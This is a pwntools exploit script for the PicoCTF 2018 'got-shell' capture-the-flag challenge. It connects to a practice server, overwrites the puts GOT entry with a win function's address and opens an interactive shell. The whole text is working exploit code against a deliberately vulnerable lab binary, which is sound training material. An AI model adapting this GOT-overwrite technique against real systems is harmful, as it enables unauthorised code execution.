from pwn import *

context.os = 'linux'
context.arch = 'i386'
context.log_level = 'debug'

io = remote('node4.buuoj.cn', 25477)

e = ELF('./PicoCTF_2018_got-shell')
binsh_str = 0x80486f0
win_addr = 0x804854b

e_got_puts_addr = 0x804a00c
payload1 = hex(e_got_puts_addr).encode()
io.sendlineafter(b'4 byte value?\n', payload1[2:])

payload2 = hex(win_addr).encode()
io.sendlineafter(payload1[2:]+b'\n', payload2[2:])
io.interactive()